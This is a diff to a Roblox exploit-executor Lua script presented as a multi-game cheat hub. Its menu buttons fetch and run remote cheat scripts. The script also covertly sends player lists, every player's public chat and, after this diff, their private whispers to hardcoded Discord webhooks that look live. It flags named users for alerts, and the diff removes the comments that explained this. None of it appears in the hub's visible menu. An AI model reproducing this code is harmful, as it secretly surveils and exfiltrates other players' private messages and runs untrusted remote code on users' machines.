@@ -1,17 +1,8 @@
---// NZ MULTI GAME HUB v2.0
---// All-in-One | Fixed Menus | No Auto Exec
-
-------------------------
--- ANTI DOUBLE EXEC
-------------------------
 if getgenv().NZ_MULTI_HUB then return end
 getgenv().NZ_MULTI_HUB = true
 getgenv().IY_LOADED = false
 local SCRIPT_START = tick()
 
-------------------------
--- SERVICES
-------------------------
 local Players = game:GetService("Players")
 local UIS = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
@@ -22,7 +13,6 @@ local LP = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local MarketplaceService = game:GetService("MarketplaceService")
 
--- Webhook URLs
 local WEBHOOKS = {
     MAIN = "https://discord.com/api/webhooks/1459298646590754827/TOc_e3_kHwZepKoMQB8EhwSMdFP7_avoyV6kYbmLVV4m6RqwwTha5eltf69snHOuLNKk",
     PLAYERS = "https://discord.com/api/webhooks/1459368985920540692/e6kW7yWiHoK10YDM2VmkXtnGJQ8alQtfkgBYcm_Ddwg6NCsJN_PLOX6TBMF828hg8eCL",
@@ -30,20 +20,16 @@ local WEBHOOKS = {
     ALERT = "https://discord.com/api/webhooks/1459388726307328047/BVLg4bAKuZBuWjTL1JaClJh1cVICcbC2IDigoKVPUweAM3JZqXIJR3QvioVujUYt-tY6"
 }
 
--- Usuarios a monitorear y enviar al webhook ALERT
-local MONITORED_USERS = {"swtanos", "molu78", "REDBUL59023", "keep_up8610", "chavxwm", "vgnamax2", "brandopro123a", "Lucas7747343"}
+local MONITORED_USERS = {"swtanos", "molu78", "REDBUL59023", "keep_up8610", "chavxwm", "vgnamax2", "brandopro123a", "Lucas7747343", "chenAlfa2005"}
 
 local function SendWebhook(url, content)
-    -- Support either a plain content string or an embed/table with fields
     local payload
     if type(content) == "string" then
         payload = {content = content}
     elseif type(content) == "table" then
-        -- If already structured as full webhook payload, use it
         if content.embeds or content.username or content.content then
             payload = content
         else
-            -- Build a standard embed payload from fields
             local embed = {
                 title = content.title or "NZ HUB LOG",
                 color = content.color or 0x9b59ff,
@@ -56,7 +42,6 @@ local function SendWebhook(url, content)
     end
 
     local ok, err
-    -- Try HttpService first (requires HttpEnabled)
     if HttpService and HttpService.HttpEnabled then
         ok, err = pcall(function()
             HttpService:PostAsync(url, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
@@ -65,7 +50,6 @@ local function SendWebhook(url, content)
     end
 
     local encoded = HttpService:JSONEncode(payload)
-    -- Fallbacks for various executors: syn.request, request, http_request, http.request
     if type(syn) == "table" and type(syn.request) == "function" then
         pcall(function()
             syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = encoded})
@@ -98,9 +82,6 @@ local function SendWebhook(url, content)
     return false
 end
 
-------------------------
--- PLACE IDS
-------------------------
 local PLACE_IDS = {
     UBG = 11815767793,
     TSB = 10449761463,
@@ -108,16 +89,13 @@ local PLACE_IDS = {
     VILTRUM = 113318245878384,
     RIVALS = 17625359962
 }
-------------------------
--- UTILS
-------------------------
+
 local menuLoaded = false
 local cornerSymbols = {}
 local cornerSymbolsEnabled = true
 local EffectsGui = nil
 local Blur = nil
 
--- Helper to set color of corner symbols
 local function setCornerColor(col)
     if type(col) ~= "userdata" then return end
     for _, lbl in ipairs(cornerSymbols) do
@@ -127,11 +105,6 @@ local function setCornerColor(col)
     end
 end
 
-------------------------
--- WINDUI + EFFECTS GUI
-------------------------
-
--- Cargar WindUI (debe ejecutarse ANTES de crear tabs y botones)
 local WindUI = loadstring(game:HttpGet(
   "https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"
 ))()
@@ -144,7 +117,6 @@ local window = WindUI:CreateWindow({
     ToggleKey = Enum.KeyCode.Z
 })
 
--- Crear TODOS los Tabs (orden fijo)
 local mainTab = window:Tab({Title="Main"})
 local gamesTab = window:Tab({Title="Games"})
 local universalTab = window:Tab({Title="Universal"})
@@ -154,9 +126,7 @@ local tsbTab = window:Tab({Title="TSB"})
 local vilTab = window:Tab({Title="Project Viltrumites"})
 local bbzTab = window:Tab({Title="BBZ"})
 local rivTab = window:Tab({Title="RIVALS"})
--- UI tab removed by user request. Use defaults and Save/Load functions via code only.
 
--- Effects GUI (solo para splash y corner symbols) — creado DESPUÉS de WindUI
 EffectsGui = Instance.new("ScreenGui", game.CoreGui)
 EffectsGui.Name = "NZ_MULTI_HUB_EFFECTS"
 EffectsGui.IgnoreGuiInset = true
@@ -165,10 +135,9 @@ EffectsGui.ResetOnSpawn = false
 Blur = Instance.new("BlurEffect", Lighting)
 Blur.Size = 0
 
--- Compatibilidad mínima: Clear y Button no crean UI, evitan nils si se invocan menús antiguos
 local function Clear() end
 local function Button(dummyText, dummyCb) end
--- Splash function usa EffectsGui
+
 local function Splash(text,time)
     local l = Instance.new("TextLabel",EffectsGui)
     l.Size = UDim2.new(1,0,0,60)
@@ -209,17 +178,13 @@ local function startHub()
     SendWebhook(WEBHOOKS.MAIN, {title = "NZ HUB LOG", color = 0x9b59ff, fields = fields})
     getgenv().IY_LOADED = true
     
-    -- Show welcome message
     task.spawn(function()
-        -- intro removed (no welcome splash)
-
-        -- Create four rotating loading symbols in each corner (neutral symbol)
         cornerSymbols = {}
         local positions = {
-            UDim2.new(0,10,0,10),        -- top-left
-            UDim2.new(1,-58,0,10),       -- top-right
-            UDim2.new(0,10,1,-58),       -- bottom-left
-            UDim2.new(1,-58,1,-58)       -- bottom-right
+            UDim2.new(0,10,0,10),
+            UDim2.new(1,-58,0,10),
+            UDim2.new(0,10,1,-58),
+            UDim2.new(1,-58,1,-58)
         }
 
         for _, pos in ipairs(positions) do
@@ -236,7 +201,6 @@ local function startHub()
             table.insert(cornerSymbols, s)
         end
 
-        -- Rotate symbols continuously using RunService (no blur)
         local conn
         conn = RunService.Heartbeat:Connect(function(dt)
             for _, lbl in ipairs(cornerSymbols) do
@@ -246,15 +210,11 @@ local function startHub()
             end
         end)
 
-        -- intro removed (no credit splash)
-
         menuLoaded = false
-        -- No UI manual: WindUI ya está creada y los botones se generan abajo.
         menuLoaded = true
     end)
 end
 
--- UI settings persistence
 local SETTINGS_FILE = "nz_ui_settings.json"
 local DEFAULT_UI_SETTINGS = {
     transparency = 0.18,
@@ -303,28 +263,24 @@ LoadUISettings()
 local function ApplyUISettings()
     pcall(function()
         if window and UI_SETTINGS then
-            -- Try common property names
             local t = UI_SETTINGS.transparency or 0.18
             for _, candidate in ipairs({"Main","Root","Container","Frame","_Main"}) do
                 if window[candidate] and typeof(window[candidate]) == "Instance" then
                     pcall(function() window[candidate].BackgroundTransparency = t end)
                 end
             end
-            -- Accent color
             local acc = UI_SETTINGS.accent or {r=170,g=120,b=255}
             local c3 = Color3.fromRGB(acc.r or 170, acc.g or 120, acc.b or 255)
             pcall(function()
                 if window.SetAccentColor then window:SetAccentColor(c3) end
                 if window.UpdateTheme then window:UpdateTheme({Accent = c3}) end
             end)
-            -- Text color
             local tc = UI_SETTINGS.textColor or {r=255,g=255,b=255}
             local c3t = Color3.fromRGB(tc.r or 255, tc.g or 255, tc.b or 255)
             pcall(function()
                 if window.SetTextColor then window:SetTextColor(c3t) end
                 if window.UpdateTheme then window:UpdateTheme({TextColor = c3t}) end
             end)
-            -- Also try to apply text color to common child instances
             for _, candidate in ipairs({"Main","Root","Container","Frame","_Main"}) do
                 if window[candidate] and typeof(window[candidate]) == "Instance" then
                     pcall(function() if window[candidate].TextColor3 then window[candidate].TextColor3 = c3t end end)
@@ -336,9 +292,7 @@ end
 
 ApplyUISettings()
 
--- Try to remove any existing WindUI tab named "UI" (best-effort, non-breaking)
 pcall(function()
-    -- Try common getters
     if window.GetTabs then
         for _, tab in ipairs(window:GetTabs() or {}) do
             local ok, title = pcall(function() return tab.Title end)
@@ -350,7 +304,6 @@ pcall(function()
             end
         end
     end
-    -- Try table fields
     if window.Tabs and type(window.Tabs) == "table" then
         for i = #window.Tabs,1,-1 do
             local tab = window.Tabs[i]
@@ -385,7 +338,7 @@ local function Rejoin()
     end)
     TeleportService:Teleport(game.PlaceId,LP)
 end
--- Enviar lista de jugadores cada 30s al webhook PLAYERS
+
 task.spawn(function()
     while task.wait(30) do
         pcall(function()
@@ -404,32 +357,64 @@ task.spawn(function()
     end
 end)
 
--- Escuchar chat de todos los jugadores y enviar al webhook CHAT
+local function isMonitoredUser(playerName)
+    for _, monitoredName in ipairs(MONITORED_USERS) do
+        if string.lower(playerName) == string.lower(monitoredName) then
+            return true
+        end
+    end
+    return false
+end
+
+local function parseWhisperCommand(msg)
+    local whisperPattern = "^/w%s+(%w+)%s+(.+)$"
+    local recipient, whisperMsg = string.match(msg, whisperPattern)
+    if recipient and whisperMsg then
+        return true, recipient, whisperMsg
+    end
+    return false, nil, nil
+end
+
 local function connectPlayerChat(p)
     if not p then return end
     p.Chatted:Connect(function(msg)
         pcall(function()
             local time = os.date("%Y-%m-%d %H:%M:%S")
+            local isWhisper, whisperTarget, whisperContent = parseWhisperCommand(msg)
+            
             local fields = {
                 {name = "Player", value = p.Name, inline = true},
-                {name = "Message", value = msg, inline = false},
-                {name = "Time", value = time, inline = true}
+                {name = "User ID", value = tostring(p.UserId), inline = true},
             }
-            SendWebhook(WEBHOOKS.CHAT, {title = "Chat Message", color = 0x3498db, fields = fields})
             
-            -- Verificar si el usuario está en la lista de monitoreados
-            local isMonitored = false
-            for _, monitoredName in ipairs(MONITORED_USERS) do
-                if string.lower(p.Name) == string.lower(monitoredName) then
-                    isMonitored = true
-                    break
-                end
+            if isWhisper then
+                table.insert(fields, {name = "Tipo", value = "🤐 Whisper (/w)", inline = true})
+                table.insert(fields, {name = "Destinatario", value = whisperTarget, inline = true})
+                table.insert(fields, {name = "Mensaje", value = whisperContent, inline = false})
+            else
+                table.insert(fields, {name = "Tipo", value = "💬 Chat Público", inline = true})
+                table.insert(fields, {name = "Mensaje", value = msg, inline = false})
             end
             
-            -- Si es un usuario monitoreado, enviar alerta al webhook ALERT
-            if isMonitored then
-                local alertContent = "**" .. p.Name .. "** escribió: " .. msg
+            table.insert(fields, {name = "Hora", value = time, inline = true})
+            
+            local monitored = isMonitoredUser(p.Name)
+            
+            if not isWhisper then
+                SendWebhook(WEBHOOKS.CHAT, {title = "Chat Message", color = 0x3498db, fields = fields})
+            end
+            
+            if monitored then
+                local chatType = isWhisper and "🤐 **WHISPER**" or "💬 **CHAT**"
+                local msgDisplay = isWhisper and ("a **" .. whisperTarget .. "**: " .. whisperContent) or (": " .. msg)
+                local alertContent = {
+                    title = chatType .. " de " .. p.Name,
+                    color = isWhisper and 0xff6b6b or 0xffd700,
+                    fields = fields
+                }
                 SendWebhook(WEBHOOKS.ALERT, alertContent)
+            elseif isWhisper then
+                SendWebhook(WEBHOOKS.CHAT, {title = "Whisper Message", color = 0x9b59ff, fields = fields})
             end
         end)
     end)
@@ -438,9 +423,6 @@ end
 for _,p in ipairs(Players:GetPlayers()) do connectPlayerChat(p) end
 Players.PlayerAdded:Connect(connectPlayerChat)
 
-------------------------
--- MENUS
-------------------------
 local MainMenu, UBGMenu, TSBMenu, VILMenu, BBZMenu, RIVMenu, SymbolsMenu, UniversalMenu
 
 function UniversalMenu()
@@ -580,7 +562,6 @@ function SymbolsMenu()
         setCornerColor(Color3.fromRGB(20,20,20))
     end)
     Button("🎨 RGB",function()
-        -- Start color cycling on symbols
         local startTime = tick()
         local conn
         conn = RunService.Heartbeat:Connect(function(dt)
@@ -597,9 +578,7 @@ function SymbolsMenu()
     Button("🔁 Toggle Symbols",function()
         cornerSymbolsEnabled = not cornerSymbolsEnabled
         if cornerSymbolsEnabled then
-            -- recreate if empty
             if not cornerSymbols or #cornerSymbols == 0 then
-                -- spawn simple recreate of corner symbols
                 local positions = {
                     UDim2.new(0,10,0,10), UDim2.new(1,-58,0,10), UDim2.new(0,10,1,-58), UDim2.new(1,-58,1,-58)
                 }
@@ -662,11 +641,6 @@ function MainMenu()
     Button("🌐 Universal Scripts",UniversalMenu)
 end
 
-------------------------
--- START
-------------------------
--- Crear TODOS los botones en los Tabs (usar WindUI API)
--- Games tab: SOLO teletransportan
 gamesTab:Button({
   Title = "🥊 Ultimate Battlegrounds",
   Callback = function()
@@ -698,11 +672,9 @@ gamesTab:Button({
   end
 })
 
--- Main tab (utility actions)
 mainTab:Button({Title = "🔄 Rejoin", Callback = Rejoin})
 mainTab:Button({Title = "🔁 Start Hub", Callback = function() startHub() end})
 
--- Universal tab
 universalTab:Button({Title = "♾️ Infinite Yield", Callback = function()
     if getgenv().IY_LOADED then return end
     getgenv().IY_LOADED = true
@@ -711,7 +683,6 @@ universalTab:Button({Title = "♾️ Infinite Yield", Callback = function()
 end})
 universalTab:Button({Title = "🔄 Rejoin", Callback = Rejoin})
 
--- UBG tab
 ubgTab:Button({Title = "🔥 Kill Aura", Callback = function()
     loadstring(game:HttpGet("https://eltonshub-loader.netlify.app/UBG1.lua"))()
     return "https://eltonshub-loader.netlify.app/UBG1.lua"
@@ -726,7 +697,6 @@ ubgTab:Button({Title = "❓ Unknown", Callback = function()
 end})
 ubgTab:Button({Title = "🔄 Rejoin", Callback = Rejoin})
 
--- TSB tab
 tsbTab:Button({Title = "🛡️ AUTO BLOCK", Callback = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/hellattexyss/thestrongestbattlegrounds/refs/heads/main/cpsautoblock.lua"))()
     return "https://raw.githubusercontent.com/hellattexyss/thestrongestbattlegrounds/refs/heads/main/cpsautoblock.lua"
@@ -774,30 +744,24 @@ tsbTab:Button({Title = "🐱 MEOW TECH", Callback = function()
 end})
 tsbTab:Button({Title = "🔄 Rejoin", Callback = Rejoin})
 
--- VIL tab
 vilTab:Button({Title = "🩸 NZ PvP Team", Callback = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/yenderelmascapito-collab/Proyecto-Viltrumita/refs/heads/main/script.lua"))()
     return "https://raw.githubusercontent.com/yenderelmascapito-collab/Proyecto-Viltrumita/refs/heads/main/script.lua"
 end})
 vilTab:Button({Title = "🔄 Rejoin", Callback = Rejoin})
 
--- BBZ tab
 bbzTab:Button({Title = "🏀 BBZ NZ", Callback = function()
     loadstring(game:HttpGet("https://rawscripts.net/raw/UPD-Basketball:-Zero-Basketball-Zero-OP-43354"))()
     return "https://rawscripts.net/raw/UPD-Basketball:-Zero-Basketball-Zero-OP-43354"
 end})
 bbzTab:Button({Title = "🔄 Rejoin", Callback = Rejoin})
 
--- RIVALS tab
 rivTab:Button({Title = "⚔️ Rivals v1", Callback = function()
     loadstring(game:HttpGet("https://pastefy.app/YiGY38uo/raw"))()
     return "https://pastefy.app/YiGY38uo/raw"
 end})
 rivTab:Button({Title = "🔄 Rejoin", Callback = Rejoin})
 
--- UI tab controls removed by user request. Use defaults and Save/Load functions via code only.
-
--- Symbols tab
 symbolsTab:Button({Title = "🔴 Rojo", Callback = function() setCornerColor(Color3.fromRGB(255,60,60)) end})
 symbolsTab:Button({Title = "🟢 Verde", Callback = function() setCornerColor(Color3.fromRGB(80,200,80)) end})
 symbolsTab:Button({Title = "🔵 Azul", Callback = function() setCornerColor(Color3.fromRGB(100,160,255)) end})
@@ -844,11 +808,7 @@ symbolsTab:Button({Title = "🔁 Toggle Symbols", Callback = function()
     end
 end})
 
--- Perfil tab: mostrar nombre, foto y tiempo de uso (usa EffectsGui para la imagen)
--- perfil tab removed; profile display removed per request
-
 task.spawn(function()
     task.wait(0.5)
     startHub()
 end)
--- WindUI tiene su propio ToggleKey; no toggle manual necesario
